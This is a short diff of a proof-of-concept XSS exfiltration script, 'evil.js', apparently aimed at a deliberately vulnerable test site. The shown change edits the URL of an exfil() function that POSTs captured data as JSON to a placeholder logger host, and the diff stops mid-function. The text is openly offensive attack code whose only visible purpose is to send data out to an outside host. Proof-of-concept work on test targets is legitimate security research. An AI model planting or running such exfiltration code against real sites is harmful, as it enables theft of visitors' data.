@@ -1,7 +1,7 @@
 // evil.js - PoC XSS Exfil untuk vulnlib.vulnapp.id
 
 function exfil(data) {
-  fetch('https://xss-exfil-logger/api/log.js', {  // DOMAIN POC
+  fetch('https://xss-exfil-logger/api/log', {  // DOMAIN POC
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(data),
